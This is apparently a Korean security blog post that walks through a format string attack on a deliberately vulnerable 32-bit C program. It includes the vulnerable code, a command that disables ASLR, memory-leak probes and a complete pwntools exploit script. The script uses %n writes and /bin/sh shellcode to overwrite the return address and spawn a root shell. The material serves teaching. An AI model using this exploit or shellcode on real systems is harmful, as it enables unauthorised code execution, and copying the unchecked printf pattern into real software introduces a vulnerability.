---
title: Format String Attack
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, format string attack]
math: true
mermaid: true
---

## Description

format string은 형태를 지정해주는 문자열을 의미한다. 형식지정자를 사용하지 않고 바로 `printf()` 함수에 인자를 입력받을 경우 발생하는 취약점이다.

## Proof of concept

```c
// Vuln Code
// gcc fmt.c -m32 -fno-stack-protector -z execstack -no-pie -o fmt
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char* argv[]){
    char buf[1024];
    printf("&buf: %p\n",&buf);
    gets(buf);
    printf(buf);
    printf("n");
    return 0;
}
```

고정된 Stack 영역을 사용하기 위해 `randomize_va_space`의 값을 0으로 변경한다.

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

형식지정자 입력 시 &buf부터 차례로 memory leak이 발생한다.

```bash
root@bs-virtual-machine:~/pwnable/fmt# ./fmt
&buf: 0xffffd150
%08x.%08x.%08x.
ffffd150.001ad23c.001ae23c.
```

Memory Leak을 하다보면 buf의 값을 확인할 수 있다.

```bash
root@bs-virtual-machine:~/pwnable/fmt# ./fmt
&buf: 0xffffd150
AAAA.0x%08x.0x%08x.0x%08x.0x%08x
AAAA.0xffffd150.0x001ad23c.0x001ae23c.0x41414141
```

처음에 넣은 AAAA(4Byte)가 4번째에 출력되고 있다. 즉 네번째에 들어가는 포맷스트링은 처음 입력한 AAAA(4Byte)를 가리키는 것을 알 수 있다. 따라서 `Ret Addr` + `%x%x%x` + `%n` payload를 통해 원하는 메모리 주소에 원하는 값으로 변조할 수 있다. 먼저 환경변수에 x86 eggShell을 삽입 후 출력되는 stack address를 통해 return address와 eggshell address를 계산한다.

```
gdb-peda$ p 0xffffd4ac-0xffffd090 (Return Address - Stack)
$1 = 0x41c
gdb-peda$ p 0xffffd6fc-0xffffd090 (EggShell Address - Stack)
$3 = 0x66c
```

## Exploit code

```python
# Exploit Code
from pwn import *
import os

# set eggshell
os.environ['eggshell'] = "x90"*100+"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

binary = ELF('./fmt')
p = process(binary.path)
stack_addr = int(p.recvline().split(' ')[1],16)
log.info('stack addr: '+hex(stack_addr))

ret_addr = stack_addr + 0x41c
eggshell_addr = stack_addr + 0x66c

log.info('ret addr: '+str(hex(ret_addr)))
log.info('eggshell addr: '+str(hex(eggshell_addr)))

eggshell_high = int("0x"+ str(hex(eggshell_addr))[2:6],16)
eggshell_low = int("0x"+str(hex(eggshell_addr))[6:10],16)

log.info("eggshell high: "+str(hex(eggshell_high)))
log.info("eggshell low: "+str(hex(eggshell_low)))

first_n = eggshell_low - 16 - 12
second_n = eggshell_high - 16 - 12 - first_n

payload = ""
payload += p32(ret_addr)
payload += "AAAA"
payload += p32(ret_addr+2)
payload += "%8x"*2
payload += "%"+str(first_n)+"c"+"%n"
payload += "%"+str(second_n)+"c"+"%n"

p.send(payload)
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/fmt# python exploit.py 
[*] '/root/pwnable/fmt/fmt'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/root/pwnable/fmt/fmt': pid 5036
[*] stack addr: 0xffffd0a0
[*] ret addr: 0xffffd4bc
[*] eggshell addr: 0xffffd70c
[*] eggshell high: 0xffff
[*] eggshell low: 0xd70c
[*] Switching to interactive mode
$ 
xbcտxffAAAAxbeտxffffffd0a0  1ad23c 
...
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/root/pwnable/fmt
```